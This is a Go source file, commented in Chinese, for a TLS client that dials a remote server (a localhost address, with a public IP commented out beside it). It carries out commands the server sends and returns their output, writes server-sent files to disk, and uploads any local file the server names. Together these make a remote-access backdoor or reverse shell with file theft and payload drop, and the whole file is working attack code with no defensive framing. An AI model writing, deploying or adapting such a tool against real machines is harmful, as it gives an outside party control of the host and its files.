package main

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

//请求连接
//发送数据

func main() {
	cert, err0 := tls.LoadX509KeyPair("client.pem", "client.key")
	if err0 != nil {
		log.Println(err0)
		return
	}
	certBytes, err := ioutil.ReadFile("client.pem")
	if err != nil {
		fmt.Println("Unable to read client.pem")
	}
	clientCertPool := x509.NewCertPool()
	ok := clientCertPool.AppendCertsFromPEM(certBytes)
	if !ok {
		fmt.Println("failed to parse root certificate")
	}
	conf := &tls.Config{
		RootCAs:            clientCertPool,
		Certificates:       []tls.Certificate{cert},
		InsecureSkipVerify: true,
	}

	//请求连接
	conn, err1 := tls.Dial("tcp", "127.0.0.1:4344", conf) //124.221.151.127:4445
	if err1 != nil {
		fmt.Println("dial failed,err:", err1)
		return
	}
	for {
		//接收server端返回的信息
		buf := [512]byte{}
		n, err := conn.Read(buf[:])
		if err != nil {
			fmt.Println("read failed,err:", err.Error())
			return
		}
		rec := string(buf[:n])
		fmt.Println("服务端传送过来的数据为:", rec)
		instruct := strings.Trim(rec, "\r\n")
		if instruct == "q" {
			err := conn.Close()
			if err != nil {
				return
			}
			break

		} else if instruct == "downfile" {
			DownFile(conn)
		} else if instruct == "upfile" {

			SendFile(conn)
		} else {
			instruction, err := exec.LookPath(instruct)
			if err != nil {
				k := err.Error()
				_, err = conn.Write([]byte(k))
				continue
			}
			cmd := exec.Command("bin", instruction)
			output, err1 := cmd.StdoutPipe()
			if err1 != nil {
				fmt.Println("read failed,err:", err1.Error())
				return
			}

			if err1 := cmd.Start(); err1 != nil {
				s := err1.Error()
				_, err = conn.Write([]byte(s))

			}
			bytes, err := ioutil.ReadAll(output)
			if err != nil {
				m := err.Error()
				_, err = conn.Write([]byte(m))
			}

			if err := cmd.Wait(); err != nil {
				n := err.Error()
				_, err = conn.Write([]byte(n))
			}
			_, err = conn.Write(bytes)
		}
	}
}
func DownFile(conn *tls.Conn) {
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("conn.Read err:", err)
		return
	}
	filename := string(buf[:n])
	fmt.Println("filename:", filename)
	if filename != "" {
		fmt.Print("接收到了文件名啦！\n")
	} else {
		return
	}
	/**
	  创建文件并写入文件内容
	*/
	fmt.Println(filename)
	file, err := os.Create(filename)
	if err != nil {
		fmt.Println("os.Create err:", err)
		return
	}

	for {
		fmt.Print("开始下载文件！\n")
		n, err := conn.Read(buf)

		if err != nil {
			fmt.Println("conn.Read err:", err)
			return
		}
		s := string(buf[:n])
		s = strings.Trim(s, "\r\n")
		fmt.Print(s + "\n")
		if s == "yes" {
			fmt.Print("传输完成！\n")

			_ = file.Close()
			return
		}
		_, _ = file.Write(buf[:n])
	}
}

func SendFile(conner *tls.Conn) {
	buf := make([]byte, 4096)
	n, _ := conner.Read(buf)
	FilePath := strings.Trim(string(buf[:n]), "\r\n")
	//查看文件属性
	FileInfo, err1 := os.Stat(FilePath)
	if err1 != nil {
		fmt.Print("os.stat err:", err1)
		return
	}
	//得到文件大小
	FileConTan := FileInfo.Size()
	fmt.Print(FileConTan, "\n")
	fmt.Print("开始传输\n")
	//得到文件名
	FileName := FileInfo.Name()
	//得到文件大小
	//FileCon:=strconv.FormatInt(FileConTan, 10)
	////发送文件大小给远程主机
	//_,_=conner.Write([]byte(FileCon))
	//发送文件名到远程主机
	_, err2 := conner.Write([]byte(FileName))
	if err2 != nil {
		fmt.Println("conn.write err:", err2)
		return
	}

	fmt.Print("开始读取文件内容！")
	//打开目标文件
	file, err4 := os.Open(FilePath)
	if err4 != nil {
		fmt.Print("os.open err:", err4)
		return
	}
	translation := make([]byte, 4096)
	//循环传输文件
	for {
		//从文件中读取数据
		fmt.Print("111\n")
		ReadLength, err5 := file.Read(translation)
		fmt.Print(ReadLength,"\n")
		if err5 != nil {
			//判断是否读完了
			if err5 == io.EOF {
				fmt.Print("文件读取完成！\n")
				Leaden := strconv.Itoa(ReadLength)
				fmt.Print(Leaden)
				_, _ = conner.Write([]byte(Leaden))
				//_, err := conner.Write([]byte("yes"))
				//fmt.Print("空字节发送完成！")
				//if err != nil {
				//	fmt.Print("nil err:", err)
				//}
				_ = file.Close()
				return
			}
		}
		fmt.Print(string(translation[:ReadLength]), "\n")
		//向远程主机发送数据
		fmt.Print("开始传输数据！\n")
		_, err6 := conner.Write(translation[:ReadLength])
		if err6 != nil {
			fmt.Print("conn write err:", err6)
			return
		}
		fmt.Print("休息一秒！\n")
		time.Sleep(1 * time.Second)
	}
}
